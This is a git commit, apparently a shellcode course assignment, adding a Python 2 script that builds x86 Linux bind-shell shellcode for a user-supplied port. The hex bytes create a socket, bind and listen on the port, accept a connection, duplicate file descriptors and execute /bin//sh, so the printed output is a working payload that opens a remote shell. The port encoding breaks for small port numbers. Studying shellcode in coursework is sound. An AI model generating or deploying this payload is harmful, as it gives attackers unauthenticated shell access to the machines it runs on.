08abb3fd353e16741880641e264f66fb83642eb4
Nuno Freitas <nuno.freitas211@gmail.com>
2018-01-17 10:45:07 +0000

    Assignment 1

---
+++ 1_BindShell/bindgen.py
@@ -0,0 +1,26 @@
+import sys
+
+total = len(sys.argv)
+if total != 2:
+	print "Usage: ./"+sys.argv[0]+" <PORT>"
+else:
+	port = int(sys.argv[1])
+	if port < 1 or port > 65535:
+		print "Invalid Port!  [ 1-65535 ]"
+		exit()
+	port = hex(port)[2:]
+	port = '\\x'+str(port[0:2])+'\\x'+str(port[2:4])
+
+	shellcode = ""
+	shellcode += "\\x6a\\x66\\x58\\x31\\xdb\\x43\\x31\\xf6\\x56\\x53\\x6a\\x02"
+	shellcode += "\\x89\\xe1\\xcd\\x80\\x97\\x31\\xc0\\xb0\\x66\\x56\\x66\\x68"
+	shellcode += port
+	shellcode += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd"
+	shellcode += "\\x80\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x04\\x56\\x57\\x89"
+	shellcode += "\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x56\\x56\\x57\\x89\\xe1\\xcd"
+	shellcode += "\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79"
+	shellcode += "\\xf9\\xb0\\x0b\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"
+	shellcode += "\\x69\\x6e\\x89\\xe3\\x56\\x53\\x89\\xe1\\x89\\xf2\\xcd\\x80"
+
+
+	print shellcode
